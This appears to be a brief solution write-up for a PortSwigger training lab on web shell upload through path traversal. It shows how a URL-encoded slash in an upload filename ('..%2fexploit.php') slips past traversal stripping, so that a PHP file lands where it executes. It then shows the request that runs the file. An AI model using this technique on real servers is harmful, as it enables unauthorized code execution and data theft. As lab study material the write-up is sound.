# Lab 03 — Web shell upload via path traversal

> **Practitioner** · [Official lab](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

**Entry point:** PHP uploads are allowed but the `/files/avatars/` directory
doesn't execute them — move the file one level up.

## Solution

1. Upload `exploit.php` — it's stored but served as plain text (no
   execution in `/files/avatars/`).
2. `filename="../exploit.php"` → the server *strips* the traversal.
3. URL-encode the slash so stripping misses it:

```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

→ "The file avatars/../exploit.php has been uploaded" — it landed in
`/files/` where PHP executes.
4. `GET /files/avatars/..%2fexploit.php` (or `/files/exploit.php`) returns
   the secret — lab solved.
